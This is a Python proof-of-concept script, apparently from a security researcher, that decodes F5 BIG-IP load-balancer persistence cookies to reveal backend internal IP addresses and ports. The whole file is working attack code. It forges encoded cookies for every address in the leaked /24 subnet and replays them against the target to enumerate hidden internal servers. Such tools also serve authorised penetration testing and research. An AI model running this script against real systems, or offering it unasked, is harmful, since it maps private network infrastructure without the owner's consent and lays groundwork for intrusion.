#!/usr/bin/env python

"""
PoC F5 BIG backend ipv4 enumeration
Usage: ./f5bigip_enum.py <target>

Example:
Probing F5 BigIP cookie against https://my_domain.com
Cookie found: ('COOKIENAME', '286589194.20480.0000')
IP found: 10.1.21.17:80
Trying 10.1.21.121
IP found: 10.1.21.121:80
Trying 10.1.21.254
"""

__author__ = 'Felipe Cerqueira - FSantos [at] TrustWave.com'

import sys
import socket
import requests


def f5bigip_encode(ipv4, port):
    arr = map(int, ipv4.split('.'))
    ipv4_encoded = int("%02x%02x%02x%02x" % (arr[3], arr[2], arr[1], arr[0]), 16)

    s = "%04x" % (port)
    inverted = s[2:] + s[0:2]
    port_encoded = int(inverted, 16)

    return "%s.%s.0000" % (ipv4_encoded, port_encoded)


def f5bigip_decode(encoded):
    (encoded_ip, encoded_port, dummy) = encoded.split('.')
    iphex = "%x" % int(encoded_ip)
    porthex = "%04x" % (int(encoded_port))

    ipv4 = "%d.%d.%d.%d" % (int(iphex[6:], 16), int(iphex[4:6], 16), int(iphex[2:4], 16), int(iphex[0:2], 16))

    if porthex[-2:] == '00':
        port = "%d" % (int(porthex[0:2], 16))
    else:
        t = porthex[-2:] + porthex[0:2]
        port = "%d" % (int(t, 16))

    return ipv4, port


class CookieNotFound(Exception):
    pass


class ProbeF5Cookie:
    def __init__(self, url, cookies=dict()):

        if len(cookies) == 0:
            self.__name = None
            self.__value = None
        else:
            k = cookies.keys()[0]
            v = cookies[k]
            self.__name = k
            self.__value = v

        r = requests.get(url, cookies=cookies)

        for name in r.cookies.iterkeys():
            if self.__validate_cookie(name, r.cookies[name]):
                self.__name = name
                self.__value = r.cookies[name]
                break

        if self.__name is None:
            raise CookieNotFound("F5 BigIP cookie not found")

    def cookie(self):
        return self.__name, self.__value

    def __validate_cookie(self, name, param):
        try:
            (ipv4, port) = f5bigip_decode(param)
            socket.gethostbyname_ex(ipv4)
            return True
        except Exception as e:
            print e.message
            return False


def main(url):
    print "Probing F5 BigIP cookie against", url

    try:
        found_ips = set()

        probe = ProbeF5Cookie(url)
        (name, value) = probe.cookie()
        print 'Cookie found:', probe.cookie()
        (ipv4, port) = f5bigip_decode(value)
        print 'IP FOUND: %s:%s' % (ipv4, port)

        found_ips.add(ipv4)
        idx = ipv4.rfind('.')
        netmask = ipv4[0:idx]


        for i in xrange(1, 255):
            target = "%s.%d" % (netmask, i)
            print "\rTrying", target,

            # You can try to enumerate Ips in a differents ports (let me know if works for you)
            encoded_cookie = f5bigip_encode(target, int(port))

            probe = ProbeF5Cookie(url, {name: encoded_cookie})
            (name, value) = probe.cookie()
            (ipv4, port) = f5bigip_decode(value)

            if ipv4 not in found_ips:
                print "\nIP FOUND: %s:%s" % (ipv4, port)
                found_ips.add(ipv4)

    except CookieNotFound as e:
        print e.message


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: %s <target>" % (sys.argv[0])
        sys.exit(1)

    main(sys.argv[1])
